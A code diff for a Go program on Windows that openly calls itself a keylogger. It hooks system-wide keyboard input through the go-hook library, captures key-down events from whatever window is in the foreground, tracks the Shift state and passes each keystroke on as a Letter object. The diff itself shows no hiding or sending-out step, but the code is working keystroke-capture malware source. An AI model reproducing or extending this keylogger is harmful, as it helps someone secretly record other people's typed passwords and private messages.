@@ -5,6 +5,7 @@ import (
 	"github.com/moutend/go-hook/pkg/keyboard"
 	"github.com/moutend/go-hook/pkg/types"
 	"golang.org/x/sys/windows"
+	"keyboard/objects"
 	"os"
 	"os/signal"
 )
@@ -16,42 +17,67 @@ var (
 	procGetKeyboardLayout = mod.NewProc("GetKeyboardLayout")
 	procGetKeyboardState  = mod.NewProc("GetKeyboardState")
 	procToUnicodeEx       = mod.NewProc("ToUnicodeEx")
+
+	shiftPressed bool = false
 )
 
-// GetForegroundWindow gets current foreground window
-func GetForegroundWindow() uintptr {
+// getForegroundWindow gets current foreground window.
+func getForegroundWindow() uintptr {
 	proc := mod.NewProc("GetForegroundWindow")
 	hwnd, _, _ := proc.Call()
 	return hwnd
 }
 
 // KeyLogger runs the keylogger
-func KeyLogger(keyOut chan types.KeyboardEvent) error {
-	// Buffer size is depends on your need. The 100 is placeholder value.
+func KeyLogger(keyOut chan objects.Letter) error {
+	// Buffer size is depended on your need. The 100 is a placeholder value.
 	keyboardChan := make(chan types.KeyboardEvent, 100)
-
 	if err := keyboard.Install(nil, keyboardChan); err != nil {
 		return err
 	}
-
 	defer keyboard.Uninstall()
 
 	signalChan := make(chan os.Signal, 1)
 	signal.Notify(signalChan, os.Interrupt)
 
-	fmt.Println("Start capturing keyboard input")
-
+	fmt.Println("Start capturing keyboard input...")
 	for {
 		select {
 		case <-signalChan:
 			fmt.Println("Received shutdown signal")
 			return nil
 		case k := <-keyboardChan:
-			if hwnd := GetForegroundWindow(); hwnd != 0 {
-				if k.Message == types.WM_KEYDOWN {
-					keyOut <- k
-				}
+			keyOut <- keyCheck(k)
+		}
+	}
+}
+
+// keyCheck checks what key was pressed on the users keyboard.
+// Additionally check if types.VK_SHIFT was pressed and released to update the shiftPressed variable.
+func keyCheck(key types.KeyboardEvent) objects.Letter {
+	if hwnd := getForegroundWindow(); hwnd != 0 {
+		if key.Message == types.WM_KEYDOWN {
+			if key.VKCode == types.VK_LSHIFT || key.VKCode == types.VK_RSHIFT {
+				shiftPressed = true
+				return createLetter(key, "SHIFT key was pressed", true)
+			}
+			return createLetter(key, "", false)
+		} else if key.Message == types.WM_KEYUP {
+			if key.VKCode == types.VK_LSHIFT || key.VKCode == types.VK_RSHIFT {
+				shiftPressed = false
+				return createLetter(key, "SHIFT key was released", true)
 			}
 		}
+	}
+	return objects.Letter{}
+}
+
+// createLetter return an objects.Letter object containing the current state of the keyboard.
+func createLetter(key types.KeyboardEvent, additionalInfo string, isShift bool) objects.Letter {
+	return objects.Letter{
+		KeyboardEvent:  key,
+		Capitalized:    shiftPressed,
+		AdditionalInfo: additionalInfo,
+		IsShift:        isShift,
 	}
 }
